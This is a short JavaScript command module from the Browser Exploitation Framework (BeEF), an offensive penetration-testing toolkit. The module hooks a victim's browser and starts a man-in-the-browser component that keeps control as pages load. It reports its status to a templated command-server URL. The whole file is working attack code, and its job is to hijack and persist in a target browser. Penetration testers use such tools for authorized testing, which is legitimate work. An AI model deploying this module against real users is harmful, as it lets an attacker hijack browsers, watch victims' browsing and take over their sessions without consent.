/*
 * Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
 * Browser Exploitation Framework (BeEF) - https://beefproject.com
 * See the file 'doc/COPYING' for copying permission
 */

beef.execute(function() {
	try{
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "Browser hooked.");
		beef.mitb.init("<%= @command_url %>", <%= @command_id %>);
		var MITBload = setInterval(function(){
				if(beef.pageIsLoaded){
					clearInterval(MITBload);
					beef.mitb.hook();
				}
			}, 100);
	}catch(e){
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "Failed to hook browser: " + e.message);
	}
});